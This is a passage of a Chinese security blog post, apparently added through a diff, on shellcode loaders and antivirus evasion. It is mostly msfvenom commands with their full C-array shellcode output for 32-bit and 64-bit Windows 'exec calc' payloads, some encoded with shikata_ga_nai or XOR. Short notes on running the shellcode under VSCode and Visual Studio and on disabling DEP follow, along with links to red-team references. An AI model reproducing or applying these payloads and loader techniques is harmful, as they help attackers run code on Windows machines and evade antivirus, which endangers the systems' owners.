+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xcc\x7a\x57\xdf\x83\x8a\x12\xf3\xf4\xec\xdc\x0b\x05\x99\xdc</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x61\x01\x0b\x8b\x1d\x0b\x6a\xfb\x81\xf4\x59\x78\xc5\x0b\x1c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\xbd\x3a\x8a\xf4\xa9\x42\x5a\xf4\x29\x15\x30\xf4\x41\xc1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x60\xa7\x74\x0e\xbd\xd4\x24\x9b\x3e\x8c\x99\x0c\x57\x32\xc7</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x7b\xf8\xcd\x22\xf8\xff\x31\xb0\xd7\xa7\x59\x4a\x68\x58\x99</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x20\x68\x08\xf1\xbf\x47\xa7\x31\x3f\x42\xe0\x59\xca\x03\x42</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf8\xcb\x09\x02\xa4\xcc\xbe\x9f\x57\xb6\xcf\x20\x98\x47\xc6</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x44\x99\x47\xe6\x7a\xa6\x91\xdf\x08\xe9\x21\x64\x02\x5c\x07</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xcd\x89\x9e\x1b\x0d\x98</span><span class="s">&#34;</span><span class="p">;</span></span></span></code></pre></div><h3 id="弹计算器" class="heading-element">
+  <a href="#%e5%bc%b9%e8%ae%a1%e7%ae%97%e5%99%a8" class="heading-mark"></a>弹计算器</h3><h4 id="32位" class="heading-element">
+  <a href="#32%e4%bd%8d" class="heading-mark"></a>32位</h4><div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">➜</span>  <span class="o">~</span> <span class="n">msfvenom</span> <span class="o">--</span><span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">exec</span> <span class="n">cmd</span><span class="o">=</span><span class="s">&#34;calc&#34;</span> <span class="o">--</span><span class="n">format</span> <span class="n">c</span> <span class="o">--</span><span class="n">arch</span> <span class="n">x86</span> <span class="o">--</span><span class="n">platform</span> <span class="n">windows</span> <span class="o">--</span><span class="n">bad</span> <span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Found</span> <span class="mi">11</span> <span class="n">compatible</span> <span class="n">encoders</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
+</span></span><span class="line"><span class="cl"><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="n">with</span> <span class="n">size</span> <span class="mi">216</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">chosen</span> <span class="n">with</span> <span class="n">final</span> <span class="n">size</span> <span class="mi">216</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="nl">size</span><span class="p">:</span> <span class="mi">216</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="nl">file</span><span class="p">:</span> <span class="mi">933</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xa5\xbf\x0f\x44\x25\x40</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">➜</span>  <span class="o">~</span> <span class="n">msfvenom</span> <span class="o">--</span><span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">exec</span> <span class="n">cmd</span><span class="o">=</span><span class="s">&#34;calc&#34;</span> <span class="o">--</span><span class="n">format</span> <span class="n">c</span> <span class="o">--</span><span class="n">arch</span> <span class="n">x86</span> <span class="o">--</span><span class="n">platform</span> <span class="n">windows</span>              
+</span></span><span class="line"><span class="cl"><span class="n">No</span> <span class="n">encoder</span> <span class="n">specified</span><span class="p">,</span> <span class="n">outputting</span> <span class="n">raw</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="nl">size</span><span class="p">:</span> <span class="mi">189</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="nl">file</span><span class="p">:</span> <span class="mi">819</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x53\xff\xd5\x63\x61\x6c\x63\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">➜</span>  <span class="o">~</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">exec</span> <span class="n">cmd</span><span class="o">=</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">f</span> <span class="n">c</span> <span class="o">--</span><span class="n">bad</span> <span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">platform</span> <span class="n">was</span> <span class="n">selected</span><span class="p">,</span> <span class="n">choosing</span> <span class="n">Msf</span><span class="o">::</span><span class="n">Module</span><span class="o">::</span><span class="n">Platform</span><span class="o">::</span><span class="n">Windows</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">arch</span> <span class="n">selected</span><span class="p">,</span> <span class="n">selecting</span> <span class="nl">arch</span><span class="p">:</span> <span class="n">x86</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">Found</span> <span class="mi">11</span> <span class="n">compatible</span> <span class="n">encoders</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
+</span></span><span class="line"><span class="cl"><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="n">with</span> <span class="n">size</span> <span class="mi">220</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">chosen</span> <span class="n">with</span> <span class="n">final</span> <span class="n">size</span> <span class="mi">220</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="nl">size</span><span class="p">:</span> <span class="mi">220</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="nl">file</span><span class="p">:</span> <span class="mi">949</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xbe\x7a\x1b\x33\xc4\xd9\xc9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x31\x83\xef\xfc\x31\x77\x0f\x03\x77\x75\xf9\xc6\x38\x61\x7f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x28\xc1\x71\xe0\xa0\x24\x40\x20\xd6\x2d\xf2\x90\x9c\x60\xfe</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5b\xf0\x90\x75\x29\xdd\x97\x3e\x84\x3b\x99\xbf\xb5\x78\xb8</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x43\xc4\xac\x1a\x7a\x07\xa1\x5b\xbb\x7a\x48\x09\x14\xf0\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xbe\x11\x4c\x3c\x34\x69\x40\x44\xa9\x39\x63\x65\x7c\x32\x3a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xa5\x7e\x97\x36\xec\x98\xf4\x73\xa6\x13\xce\x08\x39\xf2\x1f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf0\x96\x3b\x90\x03\xe6\x7c\x16\xfc\x9d\x74\x65\x81\xa5\x42</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x14\x5d\x23\x51\xbe\x16\x93\xbd\x3f\xfa\x42\x35\x33\xb7\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x11\x57\x46\xc5\x29\x63\xc3\xe8\xfd\xe2\x97\xce\xd9\xaf\x4c</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x6e\x7b\x15\x22\x8f\x9b\xf6\x9b\x35\xd7\x1a\xcf\x47\xba\x70</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0e\xd5\xc0\x36\x10\xe5\xca\x66\x79\xd4\x41\xe9\xfe\xe9\x83</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4e\xf0\xa3\x8e\xe6\x99\x6d\x5b\xbb\xc7\x8d\xb1\xff\xf1\x0d</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x30\x7f\x06\x0d\x31\x7a\x42\x89\xa9\xf6\xdb\x7c\xce\xa5\xdc</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x54\xad\x28\x4f\x34\x1c\xcf\xf7\xdf\x60</span><span class="s">&#34;</span><span class="p">;</span></span></span></code></pre></div><h4 id="64位" class="heading-element">
+  <a href="#64%e4%bd%8d" class="heading-mark"></a>64位</h4><div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">➜</span>  <span class="o">~</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">exec</span> <span class="n">cmd</span><span class="o">=</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">f</span> <span class="n">c</span> <span class="o">--</span><span class="n">bad</span> <span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span>               
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">platform</span> <span class="n">was</span> <span class="n">selected</span><span class="p">,</span> <span class="n">choosing</span> <span class="n">Msf</span><span class="o">::</span><span class="n">Module</span><span class="o">::</span><span class="n">Platform</span><span class="o">::</span><span class="n">Windows</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">No</span> <span class="n">arch</span> <span class="n">selected</span><span class="p">,</span> <span class="n">selecting</span> <span class="nl">arch</span><span class="p">:</span> <span class="n">x64</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">Found</span> <span class="mi">3</span> <span class="n">compatible</span> <span class="n">encoders</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">generic</span><span class="o">/</span><span class="n">none</span>
+</span></span><span class="line"><span class="cl"><span class="n">generic</span><span class="o">/</span><span class="n">none</span> <span class="n">failed</span> <span class="n">with</span> <span class="n">Encoding</span> <span class="n">failed</span> <span class="n">due</span> <span class="n">to</span> <span class="n">a</span> <span class="n">bad</span> <span class="nf">character</span> <span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="mi">7</span><span class="p">,</span> <span class="kt">char</span><span class="o">=</span><span class="mh">0x00</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x64</span><span class="o">/</span><span class="n">xor</span>
+</span></span><span class="line"><span class="cl"><span class="n">x64</span><span class="o">/</span><span class="n">xor</span> <span class="n">succeeded</span> <span class="n">with</span> <span class="n">size</span> <span class="mi">319</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">x64</span><span class="o">/</span><span class="n">xor</span> <span class="n">chosen</span> <span class="n">with</span> <span class="n">final</span> <span class="n">size</span> <span class="mi">319</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="nl">size</span><span class="p">:</span> <span class="mi">319</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="nl">file</span><span class="p">:</span> <span class="mi">1366</span> <span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xff\x48\xbb\xf5\x1f\xb6\x9f\x1f\x80\x55\xcb\x48\x31\x58</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x09\x57\x35\x7b\xef\x68</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x95\xcb\xf5\x1f\xf7\xce\x5e\xd0\x07\x9a\xa3\x57\x87\x4d\x7a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xc8\xde\x99\x95\x57\x3d\xcd\x07\xc8\xde\x99\xd5\x57\x3d\xed</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4f\xc8\x5a\x7c\xbf\x55\xfb\xae\xd6\xc8\x64\x0b\x59\x23\xd7</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xe3\x1d\xac\x75\x8a\x34\xd6\xbb\xde\x1e\x41\xb7\x26\xa7\x5e</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xe7\xd7\x94\xd2\x75\x40\xb7\x23\xfe\x9e\xcf\x0b\xd5\x43\xf5</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x1f\xb6\xd7\x9a\x40\x21\xac\xbd\x1e\x66\xcf\x94\xc8\x4d\x8f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x7e\x5f\x96\xd6\x1e\x50\xb6\x9d\xbd\xe0\x7f\xde\x94\xb4\xdd</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x83\xf4\xc9\xfb\xae\xd6\xc8\x64\x0b\x59\x5e\x77\x56\x12\xc1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x54\x0a\xcd\xff\xc3\x6e\x53\x83\x19\xef\xfd\x5a\x8f\x4e\x6a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x58\x0d\x8f\x7e\x5f\x92\xd6\x1e\x50\x33\x8a\x7e\x13\xfe\xdb</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x94\xc0\x49\x82\xf4\xcf\xf7\x14\x1b\x08\x1d\xca\x25\x5e\xee</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xde\x47\xde\x0c\x91\xb4\x47\xf7\xc6\x5e\xda\x1d\x48\x19\x3f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf7\xcd\xe0\x60\x0d\x8a\xac\x45\xfe\x14\x0d\x69\x02\x34\x0a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xe0\xeb\xd7\xa5\x81\x55\xcb\xf5\x1f\xb6\x9f\x1f\xc8\xd8\x46</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf4\x1e\xb6\x9f\x5e\x3a\x64\x40\x9a\x98\x49\x4a\xa4\x70\xe0</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x69\xa3\x5e\x0c\x39\x8a\x3d\xc8\x34\x20\x57\x35\x5b\x37\xbc</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x53\xb7\xff\x9f\x4d\x7f\x6a\x85\xee\x8c\xe6\x6d\xd9\xf5\x1f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xd9\x14\x42\x2f\xe0\x63\xfc\x7e\xec\x36\xe5\x90\x67\xd3\x9f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x1f\x80\x55\xcb</span><span class="s">&#34;</span><span class="p">;</span></span></span></code></pre></div><h2 id="vscode与visual-studio" class="heading-element">
+  <a href="#vscode%e4%b8%8evisual-studio" class="heading-mark"></a>vscode与Visual Studio</h2><p>经过测试，我这里的vscode无论是32位的指针执行还是动态分配执行都是可以正常弹calc的；但是64位的指针执行还是动态分配执行都不可以执行，应该是vscode的环境问题。</p>
+<p>而在Visual Studio中，32位下，动态分配的方式可以正常执行，但是如果是想要指针执行，则需要关闭DEP：</p>
+<p><img loading="lazy" src="/posts/shellcodeloader/image-20220408231623763.png" alt="image-20220408231623763" srcset="/posts/shellcodeloader/image-20220408231623763.png?size=small, /posts/shellcodeloader/image-20220408231623763.png?size=medium 1.5x, /posts/shellcodeloader/image-20220408231623763.png?size=large 2x" data-title="image-20220408231623763" style="--width: 1000px;--aspect-ratio: 1000 / 692;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>64位下，动态分配可以正常运行，但是指针执行无论如何都没有成功，找了半天解决办法仍未成功，64位程序无法关闭DEP。</p>
+<p>之后找到解决办法再写吧，占个坑位，有大佬如果知道的QQ联系QAQ.</p>
+<blockquote>
+<p><a href="https://422926799.github.io/posts/44310b89.html"target="_blank" rel="external nofollow noopener noreferrer">https://422926799.github.io/posts/44310b89.html</a></p>
+<p><a href="https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis"target="_blank" rel="external nofollow noopener noreferrer">https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis</a></p>
+<p><a href="https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&amp;shellcode.html"target="_blank" rel="external nofollow noopener noreferrer">https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&shellcode.html</a></p>
+<p><a href="https://luckyfuture.top/ShellcodeLoader.html"target="_blank" rel="external nofollow noopener noreferrer">https://luckyfuture.top/ShellcodeLoader.html</a></p>
+</blockquote>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 0001-01-01 00:00:00">更新于 0001-01-01&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/shellcodeloader/" data-title="ShellCode Loader(持续更新)" data-hashtags="免杀"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/shellcodeloader/" data-hashtag="免杀"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/shellcodeloader/" data-title="ShellCode Loader(持续更新)"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E5%85%8D%E6%9D%80/" class="post-tag" title="标签 - 免杀">免杀</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/ssti/" class="post-nav-item" rel="prev" title="SSTI payload记录"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SSTI payload记录</a>
+      <a href="/posts/powershell/" class="post-nav-item" rel="next" title="Powershell">Powershell<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
